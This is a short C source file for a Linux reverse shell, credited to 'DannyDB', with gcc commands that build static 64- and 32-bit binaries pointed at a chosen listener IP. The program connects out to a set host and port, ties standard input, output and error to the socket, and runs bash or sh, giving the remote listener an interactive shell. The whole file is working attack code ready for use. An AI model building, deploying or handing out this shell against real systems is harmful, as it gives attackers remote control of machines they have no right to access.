/*
DESCRIPTION
Simple reverse shell for linux

COMPILATION
gcc -static -o revIp simpleRevShellIp.c -DLHOST='"10.10.10.1"'
gcc -static -m32 -o revIp32 simpleRevShellIp.c -DLHOST='"10.10.10.1"'

AUTHOR
DannyDB
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>


#ifndef LHOST
#define LHOST "127.0.0.1"  //Default IP
#endif

#ifndef LPORT
#define LPORT 9001  //Default port
#endif


int main(int argc, char *argv[]){

        int sockt;
        char *terminal;
        struct sockaddr_in revsockaddr;

        sockt = socket(AF_INET, SOCK_STREAM,0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(LPORT);
        revsockaddr.sin_addr.s_addr = inet_addr(LHOST);

        if(connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
                printf("\n [!] ERROR: failed to connect\n");
                return 1;
        }
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        //Select terminal
        if(access("/bin/bash",F_OK)==0) {
        	terminal = "/bin/bash";
        }else{
        	terminal = "/bin/sh";
        }

        char * const arg[] = {terminal, NULL};
        execve(terminal, arg, NULL);

        return 0;

}





